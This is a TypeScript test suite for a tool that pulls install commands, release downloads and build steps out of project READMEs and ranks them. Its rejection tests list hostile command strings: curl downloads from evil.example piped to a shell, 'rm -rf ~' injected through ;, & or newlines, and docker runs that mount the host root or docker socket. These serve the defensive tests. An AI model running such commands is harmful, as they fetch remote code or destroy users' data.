// Run with: npm test
import assert from "node:assert/strict";
import { describe, test } from "node:test";
import {
  buildFromSource,
  composeCommand,
  downloadsFromRelease,
  hostedUrlFrom,
  osFromUserAgent,
  rankOptions,
  readmeCommands,
  readmeInstallCommands,
  safeVolume,
  strictDockerRun,
  strictPackageCommand,
  type SetupInfo,
} from "./setup";

describe("README commands: attacks are rejected", () => {
  // The four examples from the security review, plus newline injection and a single "&".
  const attacks = [
    "brew install coolapp && curl -s https://evil.example/x -o /tmp/x && bash /tmp/x",
    "pip install coolapp; rm -rf ~",
    "npx coolapp $(curl -s https://evil.example/y)",
    "sudo docker run --privileged -v /:/host coolapp/coolapp",
    "brew install coolapp\nrm -rf ~",
    "brew install coolapp\r\nrm -rf ~",
    "brew install coolapp & curl -s https://evil.example/x | sh",
    "docker run -d coolapp/coolapp & rm -rf ~",
    "docker run -d coolapp/coolapp\nrm -rf ~",
    "docker run -d \\\n  coolapp/coolapp \\\n  ; rm -rf ~",
  ];
  for (const attack of attacks) {
    test(JSON.stringify(attack), () => {
      assert.equal(strictPackageCommand(attack), null);
      assert.equal(strictDockerRun(attack), null);
      const found = readmeInstallCommands([attack], "someone/coolapp");
      assert.deepEqual(found.packageCommands, []);
      assert.deepEqual(found.dockerRunCommands, []);
      assert.equal(found.hasUncheckedSteps, true); // falls back to "See README for install steps"
    });
  }

  test("other shell tricks in package commands", () => {
    for (const command of [
      "brew install coolapp | sh",
      "brew install coolapp > ~/.zshrc",
      "brew install `curl evil`",
      "brew install ./coolapp.rb",
      "npm i -g github:evil/coolapp",
      "pip install git+https://evil.example/coolapp",
      "pip install -r requirements.txt",
      "pip install .",
      "brew install cool​app", // zero-width space
      "brew install coolapp\t&& rm -rf ~",
    ]) {
      assert.equal(strictPackageCommand(command), null, command);
    }
  });

  test("dangerous docker run flags and mounts", () => {
    for (const command of [
      "docker run --pid=host coolapp/coolapp",
      "docker run --pid host coolapp/coolapp",
      "docker run --network=host coolapp/coolapp",
      "docker run --net=host coolapp/coolapp",
      "docker run --cap-add ALL coolapp/coolapp",
      "docker run -v /:/host coolapp/coolapp",
      "docker run -v ~:/data coolapp/coolapp",
      "docker run -v $HOME:/data coolapp/coolapp",
      "docker run -v /home/me:/data coolapp/coolapp",
      "docker run -v /var/run/docker.sock:/var/run/docker.sock coolapp/coolapp",
      "docker run -v $PWD:/data coolapp/coolapp", // bare current folder is often the home folder
      "docker run -v ./../..:/data coolapp/coolapp",
      "docker run -e X=$(id) coolapp/coolapp",
      "docker run coolapp/coolapp sh -c 'curl evil | sh'", // nothing allowed after the image
    ]) {
      assert.equal(strictDockerRun(command), null, command);
    }
  });
});

describe("README commands: legitimate ones are accepted", () => {
  test("package managers", () => {
    const accepted = [
      ["brew install --cask robbietilton-compositor", "Homebrew"],
      ["winget install -e --id RustDesk.RustDesk", "winget"],
      ["sudo snap install coolapp --classic", "Snap"],
      ["flatpak install flathub com.coolapp.CoolApp", "Flatpak"],
      ["npm install -g @coolapp/cli", "npm"],
      ["npx -y coolapp", "npm"],
      ["pipx install coolapp", "pip"],
      ["pip3 install --user coolapp", "pip"],
    ];
    for (const [command, manager] of accepted) {
      assert.equal(strictPackageCommand(command)?.manager, manager, command);
    }
  });

  test("docker run, joined onto one line", () => {
    assert.equal(
      strictDockerRun("docker run -d \\\n  -p 3000:3000 \\\n  --name coolapp \\\n  coolapp/app:latest"),
      "docker run -d -p 3000:3000 --name coolapp coolapp/app:latest",
    );
    assert.equal(
      strictDockerRun("sudo docker run -d -v ${PWD}/.data:/apitable -p 80:80 --name apitable apitable/all-in-one:latest"),
      "sudo docker run -d -v ${PWD}/.data:/apitable -p 80:80 --name apitable apitable/all-in-one:latest",
    );
    assert.equal(
      strictDockerRun("docker run -it -p 80:8000 mattermost/focalboard"),
      "docker run -it -p 80:8000 mattermost/focalboard",
    );
    assert.ok(strictDockerRun("docker run -d -v pgdata:/var/lib/postgresql/data:rw -e TZ=UTC coolapp/db"));
  });

  test("volumes", () => {
    assert.equal(safeVolume("./data:/data"), true);
    assert.equal(safeVolume("$PWD/data:/data:ro"), true);
    assert.equal(safeVolume("named_volume:/data"), true);
    assert.equal(safeVolume("/:/host"), false);
    assert.equal(safeVolume("~/:/data"), false);
  });

  test("developer tooling that doesn't name the project is ignored", () => {
    const commands = readmeCommands(
      "```\nbrew install create-dmg\nnpx inlang machine translate\nnpm install -g @microsoft/rush\nbrew install --cask robbietilton-compositor\ndocker run -d postgres\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```",
    );
    const found = readmeInstallCommands(commands, "robbietilton/Compositor");
    assert.deepEqual(found.packageCommands.map((p) => p.command), ["brew install --cask robbietilton-compositor"]);
    assert.equal(found.hasUncheckedSteps, false);
    assert.equal(readmeInstallCommands(commands, "AppFlowy-IO/AppFlowy").packageCommands.length, 0);
  });

  test("a project-named remote script is flagged, never shown", () => {
    const found = readmeInstallCommands(["curl https://apitable.github.io/install.sh | bash"], "apitable/apitable");
    assert.deepEqual(found, {
      packageCommands: [],
      dockerRunCommands: [],
      hasUncheckedSteps: true,
      hasRemoteScript: true,
    });
  });

  test("README parsing strips prompts and keeps continuations together", () => {
    assert.deepEqual(readmeCommands("```sh\n$ brew install x\n# comment\ndocker run -d \\\n  x/y\n```\nOr `npx x`."), [
      "brew install x",
      "docker run -d \\\n  x/y",
      "npx x",
    ]);
  });
});

describe("hosted, downloads, build steps, ranking", () => {
  const readme = "Try it online: [live demo](https://app.example.com/)\nDocs: https://docs.example.com";

  test("hosted: strict rule", () => {
    assert.equal(hostedUrlFrom("https://app.example.com", readme), "https://app.example.com");
    assert.equal(hostedUrlFrom("https://docs.example.com", readme), null);
    assert.equal(hostedUrlFrom("javascript:alert(1)", "demo javascript:alert(1)"), null);
    assert.equal(hostedUrlFrom("https://github.com/a/b", "demo https://github.com/a/b"), null);
  });

  const release = (name: string, url = `https://github.com/o/r/releases/download/v1/${name}`) => ({
    name,
    browser_download_url: url,
  });
  const downloads = downloadsFromRelease("o/r", [
    release("App-1.0-x64.dmg"),
    release("App-1.0-arm64.dmg"),
    release("App-Setup.exe"),
    release("App.AppImage"),
    release("Mirror.exe", "https://evil.example.com/Mirror.exe"),
    release("checksums.txt"),
  ]);

  test("downloads: only this repo's own release files, best first", () => {
    assert.equal(downloads.length, 4);
    assert.equal(downloads.find((d) => d.platform === "Mac")?.fileName, "App-1.0-arm64.dmg");
  });

  const files = {
    cloneUrl: "https://github.com/o/r.git",
    folderName: "r",
    rootFiles: ["package.json", "pnpm-lock.yaml", "docker-compose.yml"],
    packageJson: { engines: { node: ">=20" }, scripts: { dev: "next dev" } },
    nvmrc: null,
    pythonVersion: null,
  };

  test("build from source", () => {
    const build = buildFromSource(files);
    assert.deepEqual(build?.prerequisites.map((p) => p.name), ["Git", "Node.js", "pnpm"]);
    assert.deepEqual(build?.steps.map((s) => s.command), [
      "git clone https://github.com/o/r.git",
      "cd r",
      "pnpm install",
      "pnpm dev",
    ]);
    assert.equal(composeCommand(files)?.command, "git clone https://github.com/o/r.git\ncd r\ndocker compose up -d");
    assert.equal(buildFromSource({ ...files, rootFiles: ["README.md"] }), null);
    assert.equal(buildFromSource({ ...files, rootFiles: ["package.json", "composer.json"] }), null);
    const python = buildFromSource({ ...files, rootFiles: ["requirements.txt"], pythonVersion: "3.11\n" });
    assert.equal(python?.prerequisites[1].version, "3.11");
    assert.equal(python?.steps.at(-1)?.command, null); // no guessed start command
  });

  test("ranking", () => {
    const setup: SetupInfo = {
      status: "ok",
      readmeUrl: "",
      hostedUrl: null,
      releaseUrl: null,
      downloads,
      packageCommands: [{ manager: "Snap", command: "snap install r", platforms: ["Linux"] }],
      dockerCommands: [],
      uncheckedReadmeSteps: false,
      readmeHasRemoteScript: false,
      buildFromSource: null,
    };
    assert.deepEqual(rankOptions(setup, "Windows").primary, {
      kind: "download",
      platform: "Windows",
      files: downloads.filter((d) => d.platform === "Windows"),
    });
    const withHosted = rankOptions({ ...setup, hostedUrl: "https://app.example.com" }, "Mac");
    assert.equal(withHosted.primary?.kind, "download"); // hosted is never primary
    assert.ok(withHosted.others.some((o) => o.kind === "hosted"));
    assert.equal(rankOptions({ ...setup, downloads: [] }, "Linux").primary?.kind, "package");
    assert.equal(rankOptions({ ...setup, downloads: [], packageCommands: [] }, "Mac").primary, null);
  });

  test("OS from user agent", () => {
    assert.equal(osFromUserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"), "Mac");
    assert.equal(osFromUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"), "Windows");
    assert.equal(osFromUserAgent("Mozilla/5.0 (X11; Linux x86_64)"), "Linux");
    assert.equal(osFromUserAgent("Mozilla/5.0 (Linux; Android 14)"), null);
  });
});
